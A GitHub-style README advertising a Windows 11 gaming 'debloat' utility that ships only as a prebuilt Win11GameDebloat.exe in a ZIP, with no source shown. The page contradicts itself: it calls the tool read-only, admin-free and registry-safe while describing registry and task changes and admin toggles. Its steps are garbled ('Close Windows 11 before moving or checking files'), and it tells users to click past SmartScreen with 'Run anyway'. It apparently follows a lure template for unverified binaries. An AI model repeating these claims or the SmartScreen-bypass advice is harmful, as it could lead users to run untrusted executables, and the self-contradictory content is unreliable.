<p align="center">
  <img src="https://i.postimg.cc/K8N6wz3M/banner.png" alt="Win11 Gaming Debloat Guard — Windows 11 Gaming Optimizer & Background Process Cleaner" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Win11%20Gaming%20Optimizer-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-win11--debloat--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Win11 Gaming Debloat Guard — Windows 11 Gaming Optimizer & Background Process Cleaner

**High idle RAM usage on Windows 11? Background telemetry, Recall snapshots, OneDrive sync, and Xbox Game DVR stealing CPU cycles during competitive games? Optimize Windows 11 for gaming with an automatic System Restore Point.**

Win11 Gaming Debloat Guard focuses on reversible Windows 10/11 performance tuning for PC gamers: **creating a System Restore Point and registry backup first**, then cleanly disabling non-essential telemetry tasks, background UWP apps, and overlay recorders without breaking Windows Update, Microsoft Store, or anti-cheat services.

This project is aimed at **Windows 10 and Windows 11 (22H2 / 23H2 / 24H2 / 25H2+) PC gamers**. It concerns reversible service/task tuning and startup cleanup—not stripping core Windows Defender protections or modifying game files.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| 4 GB–6 GB RAM used at idle on fresh Windows 11 | Background UWP apps, Widgets, Copilot, and telemetry tasks running at startup | Disable non-essential startup apps and background telemetry tasks |
| Random frame drops during intense firefights | Background Windows Search indexing or OneDrive cloud sync spiking disk I/O | Pause OneDrive during gaming and exclude game library folders from indexing |
| Input lag or capped FPS in borderless windowed games | Xbox Game Bar / Game DVR background recording and VBS overhead | Disable Game DVR background capture and verify Windowed Optimizations |
| Afraid of breaking Windows Store or Xbox App | Aggressive third-party scripts removing core Xbox Identity / Store packages | Use reversible registry toggles and keep Xbox/Store runtimes intact |

## Download for Windows

[**Download Win11GameDebloat.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Win11GameDebloat.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Win11GameDebloat.exe`? (Automatic checks in ~2 seconds)

- Creates a timestamped Windows System Restore Point and `.reg` backup before applying any tweak.
- Audits idle RAM consumption, active background telemetry tasks, and Game DVR capture flags.
- Disables non-essential bloatware tasks (Copilot, Recall, Widgets, Consumer Features) with 1-click revert.
- Preserves Windows Defender, Windows Update, Steam, and Xbox App / Game Pass dependencies.

### Sample Diagnostic Output

```text
[Win11GameDebloat] Auditing Windows 11 background gaming overhead...
[OK]   OS Build         : Windows 11 Pro 24H2 (Build 26100)
[INFO] Idle Memory      : 5.8 GB / 32.0 GB used (18 background UWP tasks active)
[WARN] Game DVR         : Background recording enabled (can cause borderless stutter)
[OK]   Safety Backup    : Restore point & registry snapshot ready before applying changes
```

The release ZIP is named `Win11GameDebloat.zip`; the Windows executable inside is named `Win11GameDebloat.exe`.

1. Close Windows 11 before moving or checking files.
2. Click **Download Win11GameDebloat.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Win11GameDebloat.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Windows 11 and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or Windows 11 (64-bit) with standard or administrator privileges depending on selected system-wide toggles.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Win11GameDebloat.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Background Windows 11 services causing random 1% low FPS drops

Scheduled telemetry collectors, Widgets, and background app syncs frequently wake up mid-match and compete with game threads for P-core/E-core scheduling.

### Xbox Game DVR & background capture adding input latency

Windows Game Bar background recording continuously encodes video buffers in the background unless explicitly disabled in `GameConfigStore`.

### Aggressive debloaters breaking Xbox Game Pass or anti-cheat

Many scripts delete `Microsoft.GamingApp` or strip Windows Security, preventing PC Game Pass games and Easy Anti-Cheat / Vanguard from launching.

### Need instant one-click rollback to stock Windows defaults

Every toggle should have a matching restore state so you can revert any change immediately.

## Where Windows 11 files normally belong

Windows gaming configuration keys and startup entries reside across standard user and machine hives:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Windows Registry & System Targets:
├── HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR\
├── HKCU\System\GameConfigStore\
├── HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection\
└── %SystemRoot%\System32\Tasks\Microsoft\Windows\Application Experience\
```

Never delete `Windows Defender` or `Xbox Identity Provider` components if you play online multiplayer or PC Game Pass titles.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close active games and launchers first.** Ensure Steam, Epic Games, and browser tabs are closed before benchmarking idle RAM.
2. **Create a System Restore Point.** Always generate a restore point and `.reg` backup before modifying Windows services.
3. **Disable Xbox Game DVR background recording.** Turn off background capture while keeping the Game Bar overlay functional if needed for Xbox party chat.
4. **Review Startup Apps in Task Manager.** Disable unneeded updaters and launch helpers that stay resident in the system tray.
5. **Set Windows Power Mode to Best Performance.** Prevent aggressive CPU core parking during competitive multiplayer sessions.
6. **Enable Hardware-Accelerated GPU Scheduling (HAGS) & Game Mode.** Verify Windows Settings → System → Display → Graphics defaults are active.
7. **Restart Windows and compare idle RAM & 1% low FPS.** Verify clean boot and test your benchmark game.

### Before moving any files

Always keep the generated `.reg` rollback file and System Restore Point so you can restore stock Windows 11 settings at any time.

## What an effective diagnostic report should tell you

A clear optimization audit reports **OS build, idle RAM usage, Game DVR capture state, active telemetry tasks, and restore-point readiness** before applying changes.

## FAQ

**Will this break Xbox Game Pass, Microsoft Store, or Windows Update?**

No. Core Xbox App, Store, Windows Update, and Defender services are preserved.

**Can I undo all optimizations and return to default Windows 11 settings?**

Yes—use the built-in Restore Defaults option or the Windows System Restore Point created before applying tweaks.

**Does this disable Windows Defender?**

No. Keeping Windows Security active protects your PC and avoids anti-cheat conflicts.

**Does it work on both Windows 10 and Windows 11?**

Yes, it supports Windows 10 (21H2/22H2) and Windows 11 (22H2/23H2/24H2+).

## Useful reading

- [Microsoft Support — Optimize Windows for Gaming](https://support.microsoft.com/en-us/windows)

## More Windows Game Diagnostic Tools

- [DX12-ShaderCacheCleaner](../DX12-ShaderCacheCleaner) — GPU Shader Cache & DirectX 12 cleaner for NVIDIA, AMD & Windows
- [WinTimer-LatencyDoctor](../WinTimer-LatencyDoctor) — Windows gaming latency, Ultimate Performance & timer check
- [NetPing-DNSGameSwitcher](../NetPing-DNSGameSwitcher) — Game server ping tester, Winsock reset & DNS switcher
- [SteamJunction-LibraryMover](../SteamJunction-LibraryMover) — Move Steam/Epic games between SSDs via NTFS Junctions

*Independent open-source Windows utility. Not affiliated with Microsoft Corporation. Always create a System Restore Point before modifying OS settings.*
 
 
 
 
 
